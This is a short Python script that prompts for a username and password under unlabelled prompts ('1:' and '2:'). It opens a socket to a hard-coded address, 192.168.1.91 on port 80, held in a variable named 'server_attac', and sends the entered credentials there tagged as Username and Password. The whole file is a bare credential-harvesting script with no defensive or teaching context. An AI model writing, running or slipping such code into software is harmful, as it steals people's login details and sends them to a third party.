
user=input("1:")
passwor=input("2:")


import socket
server_attac=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
server_attac.connect(("192.168.1.91",80))
#try:
ip=server_attac.getsockname()[1]
server_attac.send(b"[Username:"+user.encode())
server_attac.send(b"]:[Password:"+passwor.encode())
print(ip)



